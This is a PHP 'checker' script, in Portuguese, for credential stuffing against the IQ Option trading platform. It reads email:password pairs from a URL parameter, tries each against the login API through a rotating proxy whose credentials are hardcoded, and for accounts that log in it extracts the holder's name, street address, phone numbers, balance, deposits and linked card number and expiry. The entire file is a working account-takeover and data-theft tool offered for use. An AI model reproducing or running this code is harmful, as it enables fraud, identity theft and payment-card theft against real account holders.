<?php


// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


    
    error_reporting(0);
    
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}


// ================ // ====================//==========================//============================= // ================================//=================//

$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://auth.iqoption.com/api/v2/login');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: application/json',
'content-type: application/json',
'origin: https://login.iqoption.com',
'referer: https://login.iqoption.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, '{"identifier":"'.$email.'","password":"'.$senha.'"}');
$resposta = curl_exec($ini);
//$tokendaporra = getStr2($resposta, '"ssid":"','"');


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://iqoption.com/api/getprofile');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
//curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: */*',
'referer: https://iqoption.com/en',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36'

));
$profile = curl_exec($ini);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://billing.iqoption.com/api/external/card');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
//curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: application/json, text/plain, */*',
'content-type: application/json',
'referer: https://billing.iqoption.com/frontend/withdrawal/?brandId=1&isEu=false&random=C4yODA',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36'

));
$cards = curl_exec($ini);


$retorno = getStr2($resposta, '"message":"','"');


// ================ // ====================//==========================//============================= // ================================//=================//

$Nomeall = getStr2($profile, '"name":"','"');
$nacionalidade = getStr2($profile, '"nationality":"','"');
$Cidade = getStr2($profile, '"city":"','"');
$rua = getStr2($profile, '"address":"','"');

// ================ // ====================//==========================//============================= // ================================//=================//

$balanca_saldo = getStr2($profile, '"balance":',',');
$tipo_moeda = getStr2($profile, '"currency":"','"');
$depositos_feitos = getStr2($profile, '"deposit_count":',',');
$telefone_confirmados = getStr2($profile, '"confirmed_phones":["','"');

// ================ // ====================//==========================//============================= // ================================//=================//

$saques_cc = getStr2($cards, '"refund_amount":',',');
$Numero_cc = getStr2($cards, '"number":"','"');
$expiry = getStr2($cards, '"expiry":"','"');
//$dono = getStr2($cards, '"owner":"','"');

// ================ // ====================//==========================//============================= // ================================//=================//

########## MINHAS FRESCURAS ############

if (strpos($profile, '"balance":0,')) {

   $Verify_saldo = "Sem saldo.!";

} else{

   $Verify_saldo = "Saldo online: $balanca_saldo ";

}

if (strpos($cards, '"refund_amount":0,')) {

    $Money_resgat = "Nao há saque neste cartao.!";

} else{

    $Money_resgat = "Saques realizados, neste cartao: $saques_cc (Total)";

}


if (strpos($profile, '"cashback_level_info":{"enabled":false},')) {

    $Cashback_verify = "Nao tem CashBack Ativo.!";

} else {

    $Cashback_verify = "Conta ativa com CashBacks";

}

if (strpos($profile, '"deposit_in_one_click":false,')) {

    $Oneclick_deposit = "Oneclick deposito nao ativo.!";

} else{

    $Oneclick_deposit = "Oneclick depositar ativo.";

}

if (strpos($profile, '"confirmed_phones":[],')) {

    $Telefones_Confirmeds = "Nao há telefones confirmados.!";

} else{

    $Telefones_Confirmeds = "Existe telefones confirmados: $telefone_confirmados ";

}

if (strpos($cards, '"id":')) {

    $cartoes_retiradas = "Existe cartoes na conta para retiradas/saques: $Numero_cc - $expiry || Saques efetuados: $Money_resgat";

} else{

    $cartoes_retiradas = "Nao há cartoes vinculados para retirada de fundos.";

}

if (strpos($profile, '"deposit_count":0,')) {

    $Deposits_verify = "Sem depositos.!";

} else{

    $Deposits_verify = "Existe depositos feitos: $depositos_feitos (Total)";

}

// ================ // ====================//==========================//============================= // ================================//=================//
         

if (stripos($resposta, 'success')) {

echo "<span class='badge badge-success'>#Aprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> Login confirmado! <span class='badge badge-info'>NOME:</span> $Nomeall  <span class='badge badge-info'>NACIONALIDADE:</span> $nacionalidade <span class='badge badge-info'>CIDADE:</span> $Cidade  <span class='badge badge-info'>RUA:</span> $rua <span class='badge badge-info'>TELEFONES CONFIRMNADOS:</span> $Telefones_Confirmeds <span class='badge badge-info'>TIPO MOEDA:</span> $tipo_moeda  <span class='badge badge-info'>SALDO ATIVO:</span> $Verify_saldo  <span class='badge badge-info'>DEPOSITOS:</span> $Deposits_verify  <span class='badge badge-info'>CashBacks:</span> $Cashback_verify <span class='badge badge-info'>Oneclick Deposito:</span> $Oneclick_deposit  <span class='badge badge-info'>CARTAO VINCULADOS:</span> $cartoes_retiradas <br>";

}else {

    echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $retorno <br>";
}
?>